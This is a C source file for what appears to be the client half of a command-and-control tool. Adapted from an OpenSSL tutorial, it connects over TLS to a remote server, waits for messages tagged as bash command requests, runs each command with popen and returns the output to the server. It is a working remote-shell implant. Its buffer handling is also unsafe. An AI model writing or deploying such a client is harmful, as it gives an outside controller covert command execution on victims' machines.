// This is based from the following tutorial:
// https://aticleworld.com/ssl-server-client-using-openssl-in-c/
#include <errno.h>
#include <malloc.h>
#include <netdb.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <resolv.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#define LOCAL_ABORT()                                                          \
  do {                                                                         \
    printf("Abort at %s:%d\n", __FILE__, __LINE__);                            \
	return -1;                                                               \
  } while (0)

/**
 * @brief Executes a command in a pseudo terminal and returns stdout result
 *
 * @param command
 * @return char*
 */
char *execute_command(char *command) {
	FILE *fp;
	char *res = calloc(4096, sizeof(char));
	char buf[1024];

	fp = popen(command, "r");
	if (fp == NULL) {
		perror("Failed to run command");
		return NULL;
	}

	while (fgets(buf, sizeof(buf), fp) != NULL) {
		strcat(res, buf);
	}
	// printf("RESULT OF COMMAND: %s\n", res);

	pclose(fp);
	return res;
	}

int client_run(char *hostname, uint16_t portnum) {
	SSL_CTX *ctx;
	int server;
	SSL *ssl;
	static char buf[1024 * 1024];
	int bytes;

	struct hostent *host;
	struct sockaddr_in addr;
	const SSL_METHOD *method;

	// Initialize the SSL library
	SSL_library_init();

	OpenSSL_add_all_algorithms();     /* Load cryptos, et.al. */
	SSL_load_error_strings();         /* Bring in and register error messages */
	method = TLSv1_2_client_method(); /* Create new client-method instance */
	ctx = SSL_CTX_new(method);        /* Create new context */
	if (ctx == NULL) {
		ERR_print_errors_fp(stderr);
		LOCAL_ABORT();
	}

	if ((host = gethostbyname(hostname)) == NULL) {
		perror(hostname);
		LOCAL_ABORT();
	}
	server = socket(PF_INET, SOCK_STREAM, 0);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(portnum);
	addr.sin_addr.s_addr = *(long *)(host->h_addr);

	int conn_tries = 3;
	while (conn_tries >= 0) {
		if (connect(server, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
			if (conn_tries > 1) {
				conn_tries--;
				printf("Failed to connect, trying again. Remaining tries: %i\n",
					conn_tries);
				sleep(1);
				continue;
			}
			close(server);
			perror(hostname);
			fprintf(stderr, "Is the server running, and on the correct port (%d)?\n",
					portnum);
			LOCAL_ABORT();
		} else {
			// Connected
			conn_tries = -1;
		}
	}

	ssl = SSL_new(ctx);      /* create new SSL connection state */
	SSL_set_fd(ssl, server); /* attach the socket descriptor */
	conn_tries = 3;
	int connection_terminate = 0;
	while (conn_tries > 0 && connection_terminate == 0) {
		if (SSL_connect(ssl) <= 0) {
			// Connection failed
			conn_tries--;
			printf("Failed to establish SSL connection, trying again. Remaining "
					"tries: %i\n",
					conn_tries);
			ERR_print_errors_fp(stderr);
			sleep(1);
		} else {
			// Connection success
			X509 *cert;
			char *line;
			conn_tries = 0;
			printf("\nConnected with %s encryption\n", SSL_get_cipher(ssl));

			cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
			if (cert != NULL) {
				printf("Server certificates:\n");
				line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
				printf("Subject: %s\n", line);
				free(line);
				line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
				printf("Issuer: %s\n\n", line);
				free(line);
				X509_free(cert);
			} else {
				printf("Info: No client certificates configured.\n");
			}

			while(connection_terminate == 0){

				bytes = SSL_read(ssl, buf, sizeof(buf)); // Get request
				buf[bytes] = '\0';

				printf("Raw server msg:\n[%s]\n", buf);

				// If valid message in protocol, we proceed to parse it
				if (strncmp(buf, CC_PROT_BASH_COMMAND_REQUEST, strlen(CC_PROT_BASH_COMMAND_REQUEST)) == 0) {
					if (bytes > 0) {
						// printf("Reply with:\n[%s]\n", response);
						char *p;
						p = strtok(buf, "#");
						p = strtok(NULL, "#");
						if (p) {
							char *res = execute_command(p);
							char *response = calloc(4096, sizeof(char));
							if(res==NULL){
								strcpy(response, CC_PROT_ERR);
							}else{
								strcpy(response, CC_PROT_BASH_COMMAND_RESPONSE);
								strcat(response, res);
							}
							printf("Answering: \n%s\n", response);
							SSL_write(ssl, response, strlen(response));
							free(response);
						} else {
							printf("Could not parse message correctly, ignoring\n");
						}
					} else {
						ERR_print_errors_fp(stderr);
					}
				}else if (strncmp(buf, CC_PROT_FIN, strlen(CC_PROT_FIN)) == 0) { 
					printf("Server requested to stop the connection\n");
					connection_terminate = 1;
				}else {
					//If at this point, then we failed to identify the server message
					printf("Message not recognizable: %s\n", buf);
					char *response = CC_PROT_ERR;
					SSL_write(ssl, response, strlen(response));
				}
			}

		}
	}
	printf("SSL client closed\n");
	close(server);     /* close socket */
	SSL_CTX_free(ctx); /* release context */

	return 0;
}
